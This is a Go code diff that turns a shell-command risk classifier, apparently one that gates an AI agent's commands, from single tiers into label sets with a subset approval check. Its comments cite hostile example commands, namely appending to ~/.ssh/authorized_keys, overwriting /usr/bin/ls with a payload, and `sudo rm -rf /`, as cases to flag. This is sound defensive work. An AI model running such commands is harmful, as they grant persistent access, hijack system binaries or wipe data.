-	"npm": {Tier: RiskUnknown, Sub: map[string]CommandRisk{
-		"ls": RiskRead, "list": RiskRead, "view": RiskNetwork, "outdated": RiskNetwork,
-		"install": RiskNetwork, "ci": RiskNetwork, "publish": RiskNetwork,
-		"uninstall": RiskWrite, "prune": RiskWrite,
+	"npm": {Labels: L(LabelUnreadable), Sub: map[string][]RiskLabel{
+		"ls": L(LabelReads), "list": L(LabelReads), "view": L(LabelNetwork), "outdated": L(LabelNetwork),
+		"install": L(LabelNetwork), "ci": L(LabelNetwork), "publish": L(LabelNetwork),
+		"uninstall": L(LabelWrites), "prune": L(LabelWrites),
 	}},
 
 	// Named so the prompt can say WHY rather than "not in the table".
@@ -350,37 +415,37 @@ var DefaultCommandRisks = map[string]CommandRiskRule{
 
 // containerRisk is shared by the container CLIs, which are the same
 // verbs with different names on the front.
-var containerRisk = CommandRiskRule{Tier: RiskRead, Sub: map[string]CommandRisk{
-	"ps": RiskRead, "images": RiskRead, "image": RiskRead, "inspect": RiskRead,
-	"logs": RiskRead, "info": RiskRead, "version": RiskRead, "top": RiskRead,
-	"port": RiskRead, "diff": RiskRead, "stats": RiskRead,
-	"pull": RiskNetwork, "push": RiskNetwork, "login": RiskNetwork, "search": RiskNetwork,
-	"build": RiskWrite, "commit": RiskWrite, "tag": RiskWrite, "save": RiskWrite,
-	"load": RiskWrite, "create": RiskWrite, "cp": RiskWrite,
-	"run": RiskUnknown, "exec": RiskUnknown, "start": RiskUnknown, "attach": RiskUnknown,
-	"rm": RiskDestructive, "rmi": RiskDestructive, "kill": RiskDestructive,
-	"stop": RiskDestructive, "prune": RiskDestructive, "system": RiskDestructive,
-	"volume": RiskDestructive, "network": RiskDestructive,
+var containerRisk = CommandRiskRule{Labels: L(LabelReads), Sub: map[string][]RiskLabel{
+	"ps": L(LabelReads), "images": L(LabelReads), "image": L(LabelReads), "inspect": L(LabelReads),
+	"logs": L(LabelReads), "info": L(LabelReads), "version": L(LabelReads), "top": L(LabelReads),
+	"port": L(LabelReads), "diff": L(LabelReads), "stats": L(LabelReads),
+	"pull": L(LabelNetwork), "push": L(LabelNetwork), "login": L(LabelNetwork), "search": L(LabelNetwork),
+	"build": L(LabelWrites), "commit": L(LabelWrites), "tag": L(LabelWrites), "save": L(LabelWrites),
+	"load": L(LabelWrites), "create": L(LabelWrites), "cp": L(LabelWrites),
+	"run": L(LabelUnreadable), "exec": L(LabelUnreadable), "start": L(LabelUnreadable), "attach": L(LabelUnreadable),
+	"rm": L(LabelDeletes, LabelDisrupts), "rmi": L(LabelDeletes), "kill": L(LabelDisrupts),
+	"stop": L(LabelDisrupts), "prune": L(LabelDeletes), "system": L(LabelDeletes, LabelDisrupts),
+	"volume": L(LabelDeletes), "network": L(LabelDisrupts),
 }}
 
 // packageRisk covers the distro package managers, which all reach the
 // network to install and remove things locally to uninstall.
-var packageRisk = CommandRiskRule{Tier: RiskRead, Sub: map[string]CommandRisk{
-	"list": RiskRead, "show": RiskRead, "search": RiskRead, "policy": RiskRead,
-	"info": RiskRead, "depends": RiskRead,
-	"update": RiskNetwork, "install": RiskNetwork, "upgrade": RiskNetwork,
-	"dist-upgrade": RiskNetwork, "download": RiskNetwork, "source": RiskNetwork,
-	"remove": RiskDestructive, "purge": RiskDestructive, "autoremove": RiskDestructive,
-	"erase": RiskDestructive, "clean": RiskDestructive,
+var packageRisk = CommandRiskRule{Labels: L(LabelReads), Sub: map[string][]RiskLabel{
+	"list": L(LabelReads), "show": L(LabelReads), "search": L(LabelReads), "policy": L(LabelReads),
+	"info": L(LabelReads), "depends": L(LabelReads),
+	"update": L(LabelNetwork), "install": L(LabelNetwork), "upgrade": L(LabelNetwork),
+	"dist-upgrade": L(LabelNetwork), "download": L(LabelNetwork), "source": L(LabelNetwork),
+	"remove": L(LabelDeletes), "purge": L(LabelDeletes), "autoremove": L(LabelDeletes),
+	"erase": L(LabelDeletes), "clean": L(LabelDeletes),
 }}
 
 // pipRisk is the python package manager, whose install reaches out and
 // whose uninstall does not.
-var pipRisk = CommandRiskRule{Tier: RiskRead, Sub: map[string]CommandRisk{
-	"list": RiskRead, "show": RiskRead, "freeze": RiskRead, "check": RiskRead,
-	"config":  RiskRead,
-	"install": RiskNetwork, "download": RiskNetwork, "wheel": RiskNetwork,
-	"uninstall": RiskDestructive,
+var pipRisk = CommandRiskRule{Labels: L(LabelReads), Sub: map[string][]RiskLabel{
+	"list": L(LabelReads), "show": L(LabelReads), "freeze": L(LabelReads), "check": L(LabelReads),
+	"config":  L(LabelReads),
+	"install": L(LabelNetwork), "download": L(LabelNetwork), "wheel": L(LabelNetwork),
+	"uninstall": L(LabelDeletes),
 }}
 
 // runsCode is every interpreter, build tool and re-execing wrapper.
@@ -389,23 +454,19 @@ var pipRisk = CommandRiskRule{Tier: RiskRead, Sub: map[string]CommandRisk{
 // whatever X does, and there is no honest tier for that. Naming them
 // here rather than letting them fall through to "unrecognised" is what
 // lets the prompt say "runs code this classifier has not read".
-var runsCode = CommandRiskRule{Tier: RiskUnknown, Reason: "runs_unread_code"}
+var runsCode = CommandRiskRule{Labels: L(LabelUnreadable), Why: "runs_unread_code"}
 
 // newNamespace covers unshare/nsenter/chroot: the program that follows
 // runs somewhere with different rules, so reading its argv here would
 // describe the wrong thing.
-var newNamespace = CommandRiskRule{Tier: RiskUnknown, Reason: "runs_in_new_namespace"}
+var newNamespace = CommandRiskRule{Labels: L(LabelUnreadable), Why: "runs_in_new_namespace"}
 
-// reasonFor names the tier's cause in the vocabulary the prompt and
-// the model verdict share. Not prose — a closed set, so that what the
-// user reads is generated the same way every time.
-var reasonFor = map[CommandRisk]string{
-	RiskRead:        "reads_only",
-	RiskWrite:       "mutates_files",
-	RiskNetwork:     "network_egress",
-	RiskDestructive: "deletes_or_changes_machine_state",
-	RiskUnknown:     "unreadable",
-}
+// The reason vocabulary this replaces was a per-tier map whose
+// destructive entry read "deletes_or_changes_machine_state" — an "or"
+// in a category name, which is a category telling you it is two
+// categories. The labels ARE the reason now, and `Why` below carries
+// only the READING that produced them where that is not obvious from
+// the program: a scratch path, a system path, an unreadable construct.
 
 // pathScope is what a target path is part of.
 type pathScope int
@@ -548,31 +609,34 @@ func cleanPath(p string) string {
 //     removes, and a tier is a claim.
 //   - any system target: at least destructive, whatever the program.
 //     `cp payload /usr/bin/ls` is not a copy, it is a takeover.
-//   - every target scratch, and the rule offers a ScratchTier: that.
-func applyTargets(tier CommandRisk, rule CommandRiskRule, operands []riskToken, wroteTo []riskToken) (CommandRisk, string) {
+//   - every target scratch, and the rule offers a ScratchLabels: that.
+func applyTargets(labels []RiskLabel, rule CommandRiskRule, operands []riskToken, wroteTo []riskToken) ([]RiskLabel, string) {
 	targets := make([]riskToken, 0, len(operands)+len(wroteTo))
 	targets = append(targets, operands...)
 	targets = append(targets, wroteTo...)
 	if len(targets) == 0 {
-		return tier, reasonFor[tier]
+		return labels, ""
 	}
 
 	allScratch := true
 	for _, t := range targets {
 		switch pathScopeOf(t) {
 		case scopeOpaque:
-			return RiskUnknown, "opaque_target"
+			return L(LabelUnreadable), "opaque_target"
 		case scopeSystem:
-			return tier.AtLeast(RiskDestructive), "system_path"
+			// Privilege, whatever the program was doing. Writing into
+			// /usr/bin is not a copy, it is a takeover: whoever
+			// controls what root executes controls the machine.
+			return mergeLabels(labels, L(LabelPrivilege)), "system_path"
 		case scopeScratch:
 		default:
 			allScratch = false
 		}
 	}
-	if allScratch && rule.ScratchTier != "" && rule.ScratchTier.Rank() < tier.Rank() {
-		return rule.ScratchTier, "scratch_path"
+	if allScratch && len(rule.ScratchLabels) > 0 {
+		return rule.ScratchLabels, "scratch_path"
 	}
-	return tier, reasonFor[tier]
+	return labels, ""
 }
 
 // wrapperSpec describes a program that runs another program.
@@ -623,58 +687,94 @@ type RiskSegment struct {
 	// pkexec — when there was one. Named separately because a headline
 	// reading "destructive · true" for `sudo -n true` describes the
 	// wrong half of what is happening.
-	Via  string      `json:"via,omitempty"`
-	Tier CommandRisk `json:"tier"`
-	// Reason is a code from the closed set in reasonFor, or one of the
-	// unreadable codes. Never free text.
-	Reason string `json:"reason"`
+	Via string `json:"via,omitempty"`
+	// Labels is everything this segment does. Empty means an empty
+	// segment — a trailing ";" — which the caller skips.
+	Labels []RiskLabel `json:"labels"`
+	// Why names the READING that produced the labels when it was not
+	// simply the program's table entry: "scratch_path", "system_path",
+	// "shell_keyword", "opaque_target". A closed set, never free text,
+	// and empty when the labels speak for themselves.
+	Why string `json:"why,omitempty"`
 }
 
 // RiskVerdict is the classification of a whole command line.
 type RiskVerdict struct {
-	Tier CommandRisk
+	// Labels is the union across every segment.
+	//
+	// A union rather than a maximum, which is the whole change: a
+	// command that deletes AND reaches the network now reports both,
+	// where the tier this replaced kept only the worst and the egress
+	// vanished from the verdict entirely.
+	Labels []RiskLabel `json:"labels"`
 	// Programs is every program named, in order, without repeats. This
 	// is what makes a 400-character probe legible in one line.
-	Programs []string
-	Segments []RiskSegment
-	// Reason is the culprit segment's reason.
-	Reason string
-	// Culprit is the segment that set the tier, and CulpritIndex its
-	// 1-based position. Empty and 0 when there is no single one.
-	Culprit      string
-	CulpritIndex int
-	// Unreadable counts segments the classifier could not read, which
-	// is what the prompt reports when the tier is unknown.
-	Unreadable int
-	// FromModel records that a configured model moved the tier. Display
-	// only; the tier itself is already the final answer.
-	FromModel bool
+	Programs []string      `json:"programs,omitempty"`
+	Segments []RiskSegment `json:"segments,omitempty"`
+	// Why is the culprit segment's reading.
+	Why string `json:"why,omitempty"`
+	// Culprit is the segment carrying the severest label, and
+	// CulpritIndex its 1-based position. Display only — nothing gates
+	// on severity, and this exists so the prompt quotes the step that
+	// caused the ask rather than the whole line.
+	Culprit      string `json:"culprit,omitempty"`
+	CulpritIndex int    `json:"culprit_index,omitempty"`
+	// Unreadable counts segments the classifier could not read.
+	Unreadable int `json:"unreadable,omitempty"`
+	// FromModel records that a configured model contributed labels.
+	FromModel bool `json:"from_model,omitempty"`
+}
+
+// Approved reports whether every label this command carries is one the
+// operator approved.
+//
+// THE GATE, and deliberately a subset check rather than a comparison.
+// Nothing is ranked: a command may run when everything it does was
+// approved, and asks otherwise. LabelUnreadable is never in an
+// approved set, so a command nobody could read always asks.
+func (v RiskVerdict) Approved(approved map[RiskLabel]bool) bool {
+	if len(v.Labels) == 0 {
+		return false
+	}
+	for _, l := range v.Labels {
+		// Refused by name, not merely by being absent from the set. An
+		// operator cannot approve "everything I could not read" even by
+		// writing it out, and ApprovedLabels rejects it at parse time
+		// too — belt and braces, because this is the one label whose
+		// approval would approve everything.
+		if l == LabelUnreadable || !approved[l] {
+			return false
+		}
+	}
+	return true
 }
 
 // ClassifyRisk reads a command line and says what it does.
 //
 // Never returns an error: an input it cannot read is a verdict of
-// RiskUnknown, which is a real answer and the one that asks.
+// L(LabelUnreadable), which is a real answer and the one that asks.
 func ClassifyRisk(raw string) RiskVerdict {
 	cmd := strings.TrimSpace(raw)
 	if cmd == "" || !utf8.ValidString(cmd) {
-		return RiskVerdict{Tier: RiskUnknown, Reason: "unreadable"}
+		return RiskVerdict{Labels: L(LabelUnreadable), Why: "unreadable"}
 	}
 	segs, ok := splitRiskSegments(cmd)
 	if !ok || len(segs) == 0 {
-		return RiskVerdict{Tier: RiskUnknown, Reason: "unreadable"}
+		return RiskVerdict{Labels: L(LabelUnreadable), Why: "unreadable"}
 	}
 
 	table := ActiveCommandRisks()
-	v := RiskVerdict{Tier: RiskRead}
+	var v RiskVerdict
 	seen := map[string]bool{}
+	worst := 0
 	for _, seg := range segs {
 		rs := classifyRiskSegment(seg, table)
-		if rs.Tier == "" {
+		if len(rs.Labels) == 0 {
 			continue // an empty segment: a trailing ";" or a stray "&&"
 		}
 		v.Segments = append(v.Segments, rs)
-		if rs.Tier == RiskUnknown {
+		v.Labels = mergeLabels(v.Labels, rs.Labels)
+		if hasLabel(rs.Labels, LabelUnreadable) {
 			v.Unreadable++
 		}
 		// The wrapper first, then the program it ran: `sudo`, `true`.
@@ -682,24 +782,21 @@ func ClassifyRisk(raw string) RiskVerdict {
 		// `done` alongside `id` and `uname` turns the one legible line
 		// in the prompt back into noise.
 		for _, name := range []string{rs.Via, rs.Program} {
-			if name == "" || seen[name] || rs.Reason == "shell_keyword" {
+			if name == "" || seen[name] || rs.Why == "shell_keyword" {
 				continue
 			}
 			seen[name] = true
 			v.Programs = append(v.Programs, name)
 		}
-		if rs.Tier.Rank() > v.Tier.Rank() {
-			v.Tier = rs.Tier
-			v.Reason = rs.Reason
-			v.Culprit = rs.Raw
-			v.CulpritIndex = len(v.Segments)
+		// Severity picks which segment the prompt quotes. It decides
+		// nothing about whether the command runs.
+		if sev := severityOf(rs.Labels); sev > worst {
+			worst = sev
+			v.Culprit, v.CulpritIndex, v.Why = rs.Raw, len(v.Segments), rs.Why
 		}
 	}
 	if len(v.Segments) == 0 {
-		return RiskVerdict{Tier: RiskUnknown, Reason: "unreadable"}
-	}
-	if v.Reason == "" {
-		v.Reason = reasonFor[v.Tier]
+		return RiskVerdict{Labels: L(LabelUnreadable), Why: "unreadable"}
 	}
 	return v
 }
@@ -707,54 +804,56 @@ func ClassifyRisk(raw string) RiskVerdict {
 // classifyRiskSegment reads one segment's argv.
 func classifyRiskSegment(seg riskSegment, table map[string]CommandRiskRule) RiskSegment {
 	out := RiskSegment{Raw: seg.raw}
-	if seg.unreadable != "" {
-		out.Tier, out.Reason = RiskUnknown, seg.unreadable
+	unreadable := func(program, why string) RiskSegment {
+		out.Program, out.Labels, out.Why = program, L(LabelUnreadable), why
 		return out
+	}
+	if seg.unreadable != "" {
+		return unreadable("", seg.unreadable)
 	}
 	tokens := seg.tokens
 	if len(tokens) == 0 {
-		return out // Tier "" — the caller skips it
+		return out // no labels — the caller skips it
 	}
 
 	// Wrappers first, and bounded: a chain longer than this is not a
 	// command anybody wrote by hand, and an unbounded loop over
 	// attacker-shaped argv is not worth the elegance.
-	floor := CommandRisk("")
+	var floor []RiskLabel
 	for range 4 {
-		name := programName(tokens[0])
 		if tokens[0].expands {
-			out.Program, out.Tier, out.Reason = "", RiskUnknown, "variable_command"
-			return out
+			return unreadable("", "variable_command")
 		}
+		name := programName(tokens[0])
 		w, isWrapper := wrapperCommands[name]
 		if !isWrapper {
 			break
 		}
 		rest, ok := unwrap(tokens[1:], w)
 		if !ok {
-			out.Program, out.Tier, out.Reason = name, RiskUnknown, "unreadable_wrapper"
-			return out
+			return unreadable(name, "unreadable_wrapper")
 		}
 		if w.root {
-			floor = floor.AtLeast(RiskDestructive)
+			// Privilege is ADDED, not substituted. `sudo rm -rf /` is a
+			// deletion and a privilege escalation, and reporting only
+			// one of them describes half of what is happening.
+			floor = mergeLabels(floor, L(LabelPrivilege))
 			out.Via = name
 		}
 		tokens = rest
 	}
 
-	name := programName(tokens[0])
 	if tokens[0].expands {
-		out.Program, out.Tier, out.Reason = "", RiskUnknown, "variable_command"
-		return out
+		return unreadable("", "variable_command")
 	}
+	name := programName(tokens[0])
 	out.Program = name
 
 	if shellReservedWords[name] {
 		// `for`, `while`, `if`, `time`. The body is not parsed; see the
 		// non-goal in the design. Reported distinctly so the prompt can
 		// say "shell loop" rather than "unrecognised command: for".
-		out.Tier, out.Reason = RiskUnknown, "shell_keyword"
-		return out
+		return unreadable(name, "shell_keyword")
 	}
 
 	rule, found := table[name]
@@ -764,17 +863,17 @@ func classifyRiskSegment(seg riskSegment, table map[string]CommandRiskRule) Risk
 		// "reaches off the box" is written down, and an operator who
 		// adds a command there should not have to add it twice.
 		if class, ok := ActiveCommandClasses()[name]; ok && class.Action != "" {
-			out.Tier, out.Reason = riskOfAction(class.Action), "network_egress"
-			return out.withFloor(floor)
+			out.Labels = mergeLabels(labelsOfAction(class.Action), floor)
+			return out
 		}
-		out.Tier, out.Reason = RiskUnknown, "unrecognised_command"
-		return out.withFloor(floor)
+		return unreadable(name, "unrecognised_command")
 	}
 
-	tier := rule.Tier
-	if tier == "" {
-		tier = RiskUnknown
+	labels := rule.Labels
+	if len(labels) == 0 {
+		labels = L(LabelUnreadable)
 	}
+	out.Why = rule.Why
 	args := tokens[1:]
 
 	if len(rule.Sub) > 0 {
@@ -783,37 +882,34 @@ func classifyRiskSegment(seg riskSegment, table map[string]CommandRiskRule) Risk
 		case !ok:
 			// Bare invocation: `git` on its own prints usage.
 		case expands:
-			out.Tier, out.Reason = RiskUnknown, "variable_subcommand"
-			return out.withFloor(floor)
+			return unreadable(name, "variable_subcommand")
 		default:
-			if t, named := rule.Sub[sub]; named {
-				tier = t
-			} else {
-				out.Tier, out.Reason = RiskUnknown, "unrecognised_subcommand"
-				return out.withFloor(floor)
+			named, ok := rule.Sub[sub]
+			if !ok {
+				return unreadable(name, "unrecognised_subcommand")
 			}
+			labels = named
 		}
-	} else if rule.OperandTier != "" {
+	} else if len(rule.OperandLabels) > 0 {
 		if _, _, ok := firstOperand(args); ok {
-			tier = tier.AtLeast(rule.OperandTier)
+			labels = mergeLabels(labels, rule.OperandLabels)
 		}
 	}
 
 	for _, tok := range args {
 		for pattern, esc := range rule.Escalate {
 			if escalateMatches(pattern, tok.text) {
-				tier = tier.AtLeast(esc)
+				labels = mergeLabels(labels, esc)
 			}
 		}
 	}
 	if len(seg.writeTargets) > 0 {
 		// A redirection writes whatever the program on the left prints,
-		// so the tier is at least a write however innocent that program
-		// is. `echo pwned > ~/.ssh/authorized_keys` is the case that
-		// makes this non-negotiable.
-		tier = tier.AtLeast(RiskWrite)
+		// so the segment writes however innocent that program is.
+		// `echo pwned > ~/.ssh/authorized_keys` is the case that makes
+		// this non-negotiable.
+		labels = mergeLabels(labels, L(LabelWrites))
 	}
-	reason := reasonFor[tier]
 
 	// Only a targeting program's own operands are read as paths. For
 	// anything else the operands are inputs — `grep root /etc/passwd`
@@ -824,36 +920,21 @@ func classifyRiskSegment(seg riskSegment, table map[string]CommandRiskRule) Risk
 		operands = targetOperands(args, rule.TargetLast)
 	}
 	if len(operands) > 0 || len(seg.writeTargets) > 0 {
-		tier, reason = applyTargets(tier, rule, operands, seg.writeTargets)
+		labels, out.Why = applyTargets(labels, rule, operands, seg.writeTargets)
 	}
 
-	if rule.Reason != "" && tier == rule.Tier {
-		reason = rule.Reason
-	}
-	out.Tier = tier
-	out.Reason = reason
-	return out.withFloor(floor)
+	out.Labels = mergeLabels(labels, floor)
+	return out
 }
 
-// withFloor raises a segment to a floor a wrapper imposed, keeping the
-// wrapper's reason where it is the thing that set the tier.
-func (s RiskSegment) withFloor(floor CommandRisk) RiskSegment {
-	if floor == "" || floor.Rank() <= s.Tier.Rank() {
-		return s
-	}
-	s.Tier = floor
-	s.Reason = "privilege_escalation"
-	return s
-}
-
-// riskOfAction maps a command class's action onto a tier, so the two
+// labelsOfAction maps a command class's action onto labels, so the two
 // tables cannot drift.
-func riskOfAction(action string) CommandRisk {
+func labelsOfAction(action string) []RiskLabel {
 	switch action {
 	case RemoteAction, RemoteCopyAction, NetFetchAction:
-		return RiskNetwork
+		return L(LabelNetwork)
 	default:
-		return RiskUnknown
+		return L(LabelUnreadable)
 	}
 }
 
@@ -1319,7 +1400,7 @@ func SetCommandRisks(m map[string]CommandRiskRule) {
 		merged[k] = v
 	}
 	for k, v := range m {
-		if v.Tier == "" && len(v.Sub) == 0 && len(v.Escalate) == 0 && v.OperandTier == "" {
+		if len(v.Labels) == 0 && len(v.Sub) == 0 && len(v.Escalate) == 0 && len(v.OperandLabels) == 0 {
 			delete(merged, k)
 			continue
 		}
@@ -1347,23 +1428,26 @@ const riskProgramsShown = 8
 // it touches. The verbatim command still follows — this is added to
 // it, never instead of it.
 func RiskHeadline(v RiskVerdict) string {
-	if v.Tier == "" {
+	if len(v.Labels) == 0 {
 		return ""
 	}
 	var b strings.Builder
-	b.WriteString(v.Tier.Label())
+	// The label set leads, severest first. A command that deletes AND
+	// reaches the network says both — which is the point of the set,
+	// and what a single tier could not tell you.
+	b.WriteString(RenderLabels(v.Labels))
 
 	switch {
-	case v.Tier == RiskUnknown && v.Unreadable > 0 && len(v.Segments) > 1:
+	case hasLabel(v.Labels, LabelUnreadable) && v.Unreadable > 0 && len(v.Segments) > 1:
 		fmt.Fprintf(&b, " · %d of %d steps unreadable (%s)",
-			v.Unreadable, len(v.Segments), v.Reason)
-	case v.Tier != RiskRead && v.CulpritIndex > 0 && len(v.Segments) > 1:
+			v.Unreadable, len(v.Segments), v.Why)
+	case v.CulpritIndex > 0 && len(v.Segments) > 1 && severityOf(v.Labels) > labelSeverity[LabelReads]:
 		// Naming the step is the largest readability win there is: in a
 		// 300-character probe, one `rm` is why the question is being
 		// asked and the other eight steps are noise.
 		fmt.Fprintf(&b, " · `%s` (step %d of %d)", v.Culprit, v.CulpritIndex, len(v.Segments))
-	case v.Reason != "":
-		b.WriteString(" · " + v.Reason)
+	case v.Why != "":
+		b.WriteString(" · " + v.Why)
 	}
 
 	if len(v.Programs) > 0 {
@@ -1376,53 +1460,67 @@ func RiskHeadline(v RiskVerdict) string {
 		}
 	}
 	if v.FromModel {
-		// Said out loud, because a tier a model moved is a different
-		// kind of claim from one the classifier read off the argv.
+		// Said out loud, because a label a model contributed is a
+		// different kind of claim from one read off the argv.
 		b.WriteString(" · model")
 	}
 	return b.String()
 }
 
-// RiskGrantResource is the key a grant covering a whole TIER is
-// recorded under.
+// RiskGrantResource is the key a grant covering ONE LABEL is recorded
+// under.
+//
+// Per label rather than per command, because that is what makes the
+// grant compose: a conversation that has approved "reads" and "writes"
+// satisfies a command carrying both, without anybody having granted
+// that exact pair. The gate subtracts what is already granted and asks
+// about the remainder.
 //
 // A sentinel in the shape of the "(cwd=…)" and "(remote=…)" keys and
 // of !unclassified: a real key always begins with a rendered command
 // token, and NormaliseCommand single-quotes anything starting with "("
 // — so no command can land in this namespace by accident, and an
 // operator writing one has said what they meant.
-func RiskGrantResource(tier CommandRisk) string {
-	if !tier.Valid() {
+func RiskGrantResource(label RiskLabel) string {
+	if !label.Valid() || label == LabelUnreadable {
+		// Unreadable is never grantable. "Allow everything I could not
+		// read" is not a decision anybody can make.
 		return ""
 	}
-	return "(risk=" + string(tier) + ")"
+	return "(risk=" + string(label) + ")"
 }
 
-// commandRiskKey carries the classified tier from the approval gate to
-// the policy condition evaluator.
+// commandLabelsKey carries the classified labels from the approval gate
+// to the policy condition evaluator.
 //
 // On the context rather than in the Evaluate signature, because the
 // engine's question is (subject, action, resource) and widening it for
 // one condition would put a shell concept into every policy check.
 // ConditionEvaluator already takes a ctx for exactly this.
-type commandRiskKey struct{}
+type commandLabelsKey struct{}
 
-// WithCommandRisk records the tier this request was classified into.
+// WithCommandLabels records what this request was classified as.
 //
-// The tier comes from the classifier over the parameters the executor
+// The labels come from the classifier over the parameters the executor
 // is about to run, never from anything the model wrote as prose — the
 // same reason the turn identity comes from the request context.
-func WithCommandRisk(ctx context.Context, tier CommandRisk) context.Context {
-	if !tier.Valid() {
+func WithCommandLabels(ctx context.Context, labels []RiskLabel) context.Context {
+	kept := make([]RiskLabel, 0, len(labels))
+	for _, l := range labels {
+		if l.Valid() {
+			kept = append(kept, l)
+		}
+	}
+	if len(kept) == 0 {
 		return ctx
 	}
-	return context.WithValue(ctx, commandRiskKey{}, tier)
+	return context.WithValue(ctx, commandLabelsKey{}, kept)
 }
 
-// CommandRiskFrom reads the tier back. ok=false means this request was
-// never classified — a memory write, say — and a rule conditioned on a
-// tier must not apply to it.
-func CommandRiskFrom(ctx context.Context) (CommandRisk, bool) {
-	t, ok := ctx.Value(commandRiskKey{}).(CommandRisk)
-	return t, ok
+// CommandLabelsFrom reads them back. ok=false means this request was
+// never classified — a memory write, say — and a rule conditioned on
+// labels must not apply to it.
+func CommandLabelsFrom(ctx context.Context) ([]RiskLabel, bool) {
+	l, ok := ctx.Value(commandLabelsKey{}).([]RiskLabel)
+	return l, ok
 }
